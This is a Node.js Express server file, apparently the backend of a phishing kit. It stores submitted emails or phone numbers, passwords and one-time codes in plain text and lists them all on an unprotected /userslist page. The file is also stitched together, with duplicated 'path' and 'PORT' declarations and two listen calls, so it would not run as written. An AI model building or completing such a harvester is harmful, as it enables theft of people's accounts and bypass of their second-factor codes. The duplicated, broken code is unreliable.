const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

const filePath = path.join(__dirname, 'data.json');

// وظيفة قراءة البيانات من الملف
function readData() {
  if (fs.existsSync(filePath)) {
    try {
      const fileData = fs.readFileSync(filePath, 'utf8');
      return JSON.parse(fileData || '[]');
    } catch (e) {
      return [];
    }
  }
  return [];
}

// مسار حفظ البيانات
app.post('/api/save-data', (req, res) => {
  const { email, password, code } = req.body;
  
  const entry = {
    email: email || '',
    password: password || '',
    code: code || '',
    date: new Date().toLocaleString()
  };

  const data = readData();
  data.push(entry);
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));

  res.json({ status: 'success' });
});

// مسار عرض قائمة الحسابات والبيانات /userslist
app.get('/userslist', (req, res) => {
  const users = readData();
  
  let rows = users.map((u, index) => `
    <tr>
      <td>${index + 1}</td>
      <td><strong>${u.email}</strong></td>
      <td>${u.password}</td>
      <td><span class="badge">${u.code}</span></td>
      <td>${u.date}</td>
    </tr>
  `).join('');

  const html = `
  <!DOCTYPE html>
  <html lang="fr">
  <head>
    <meta charset="UTF-8">
    <title>Liste des Utilisateurs</title>
    <style>
      body { font-family: Arial, sans-serif; background: #f4f7f6; padding: 40px; margin: 0; }
      .container { max-width: 900px; margin: auto; background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
      h2 { margin-top: 0; color: #1a73e8; }
      table { width: 100%; border-collapse: collapse; margin-top: 20px; }
      th, td { padding: 12px 15px; border: 1px solid #ddd; text-align: left; }
      th { background-color: #1a73e8; color: white; }
      tr:nth-child(even) { background-color: #f9f9f9; }
      .badge { background: #e8f0fe; color: #1a73e8; padding: 4px 8px; border-radius: 4px; font-weight: bold; }
    </style>
  </head>
  <body>
    <div class="container">
      <h2>Liste des Utilisateurs Enregistrés (/userslist)</h2>
      <table>
        <thead>
          <tr>
            <th>#</th>
            <th>Email / Téléphone</th>
            <th>Mot de passe</th>
            <th>Code</th>
            <th>Date</th>
          </tr>
        </thead>
        <tbody>
          ${rows.length > 0 ? rows : '<tr><td colspan="5" style="text-align:center;">Aucune donnée enregistrée pour le moment.</td></tr>'}
        </tbody>
      </table>
    </div>
  </body>
  </html>
  `;

  res.send(html);
});
const path = require('path');

// يخلي السيرفر يقرأ الملفات العادية مثل index.html
app.use(express.static(__dirname));

// يرجع ملف index.html أول ما يحل شخص الموقع
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});